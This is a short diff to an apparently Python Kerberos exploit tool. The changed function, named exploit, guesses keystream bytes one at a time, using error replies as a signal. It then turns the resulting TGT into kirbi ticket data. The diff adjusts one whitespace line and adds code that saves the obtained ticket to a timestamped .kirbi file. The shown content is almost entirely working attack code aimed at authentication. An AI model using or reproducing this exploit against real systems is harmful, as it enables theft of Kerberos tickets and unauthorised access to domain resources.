@@ -171,7 +171,7 @@ async def exploit(args):
 			if rep['msg-type'] == 30:
 				#print('Guessed wrong...')
 				continue
-				
+			
 			print('[+] Correctly guessed keystream byte position %s: 0x%s' % (hex(orig_keystream_len+tslen), byteguess.hex()))
 			keystream = keystream_guess
 			break
@@ -206,6 +206,10 @@ async def exploit(args):
 	kirbi = tgt_to_kirbi(rep, session_key, now).dump()
 	print('[+] KIRBI DATA:')
 	print(format_kirbi(kirbi))
+	filename = '%s.kirbi' % (now.strftime("%Y%m%d_%H%M%S"))
+	print('[+] Writing .kirbi file to: %s' % filename)
+	with open(filename, 'wb') as f:
+		f.write(kirbi)
 	
 
 def main():
